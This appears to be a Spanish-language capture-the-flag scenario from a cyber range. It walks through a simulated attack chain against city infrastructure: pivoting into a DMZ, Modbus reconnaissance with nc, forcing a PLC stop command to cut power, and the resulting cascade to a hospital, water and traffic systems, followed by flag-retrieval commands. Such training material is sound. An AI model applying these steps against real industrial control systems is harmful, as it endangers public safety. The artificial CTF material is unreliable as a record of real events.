# Escenario CTF 01: Apagón Urbano en Cascada (THM / HTB Style)

**Dificultad**: Media  
**Categoría**: Industrial Cybersecurity / OT Hacking / CPS Cascading Failures  
**Autor**: CityLab Cyber Range  

---

## 1. Breve del Escenario (Storyline)

Una célula adversaria ha ganado acceso inicial a la red corporativa de la municipalidad (`10.0.1.10`). El objetivo táctico es comprometer la red de infraestructura crítica de la ciudad, provocando un colapso en cascada que afecte la generación eléctrica, el suministro de agua potable y la red de semáforos urbanos.

---

## 2. Mapa de Red e IPs Relevantes

- **Atacante (Corporate Zone)**: `10.0.1.10` (`h_attacker`)
- **Salto DMZ (DMZ Zone)**: `10.0.2.10` (`h_dmz`)
- **Servidor SCADA Central (DMZ)**: `10.0.2.20:8080` (`h_scada`)
- **PLC Agua OT**: `10.0.3.10:502` (`h_plc`)
- **PLC Gas OT**: `10.0.3.12:502` (`h_plc_gas`)
- **PLC Eléctrico OT**: `10.0.3.13:502` (`h_plc_elec`)
- **PLC Transporte OT**: `10.0.3.14:502` (`h_plc_tr`)

---

## 3. Cadena de Ataque (Walkthrough Paso a Paso)

### Paso 1: Pivoteo de Corporate a DMZ
1. Desde la máquina de ataque, verificar conectividad con la DMZ (`10.0.2.10`):
   ```bash
   ping -c 2 10.0.2.10
   ssh user@10.0.2.10
   ```
2. Inspeccionar la API REST del Servidor SCADA Central:
   ```bash
   curl -s http://10.0.2.20:8080/api/telemetry | jq .
   ```
   *Obtener estado de bobinas Modbus y telemetría de todos los sectores.*

### Paso 2: Reconocimiento Modbus en la Zona OT (`10.0.3.0/24`)
1. Probar acceso al puerto `TCP/502` de los PLCs desde la DMZ (o vía Modbus Proxy en `10.0.2.20:15020` con Unit ID 3):
   ```bash
   nc -zv 10.0.3.13 502
   ```
2. Enviar comando de encendido / habilitación al PLC eléctrico (`Coil 0: start_cmd`, `Coil 2: actuator_running`):
   ```bash
   python3 attacker/attack_multisector.py --sector elec --mode start
   ```

### Paso 3: Inyección de Disparo Eléctrico (Sabotaje Cinético)
1. Forzar la detención de generación eléctrica mediante comando de parada (`Coil 1 = 1` / `stop_cmd` en `10.0.3.13`):
   ```bash
   python3 attacker/attack_multisector.py --sector elec --mode stop
   ```

### Paso 4: Validación del Efecto Dominó en Cascada
1. Monitorear el registro centralizado de eventos (`cascading_events.csv`):
   - **T+0s**: `grid_freq_hz` cae de $60.0\text{ Hz}$ a $<58.0\text{ Hz}$.
   - **T+2s**: `hospital_on_ups = 1` (Failover del Hospital a baterías/generador diésel).
   - **T+5s**: `grid_voltage_pu` cae a $0.0\text{ pu} \implies \text{power\_available} = \text{False}$.
   - **T+7s**: Bomba P1 de Agua se apaga por falta de energía.
   - **T+12s**: Semáforos urbanos entran en `FLASHING_YELLOW_EMERGENCY` $\implies \text{transport\_congestion} \to 1.0$.
   - **T+20s**: Tanque T2 de Agua se vacía por consumo urbano $\implies \text{water\_trip} = 1$.
   - **Alerta final**: `CASCADING_BLACKOUT+HOSPITAL_UPS`.

---

## 4. Flags del Desafío CTF

Las flags de este escenario son generadas y verificadas dinámicamente por el servidor en función de la semilla de sesión `CITYLAB_SESSION_SEED` y el cumplimiento de las condiciones físicas y operativas reales.

### 🏁 Obtención y Verificación de Flags:
```bash
# Evaluar cumplimiento de objetivos y obtener flags server-side:
python3 scripts/run_scenario.py --id 01 --check

# O mediante consulta REST al Flag Service:
curl -s http://10.0.2.20:8570/api/flag/mint/01/FLAG_1

# Enviar flag obtenida para registro en el Scoreboard:
python3 scripts/run_scenario.py --id 01 --submit "FLAG_1{...}" --team "tu_equipo"
```
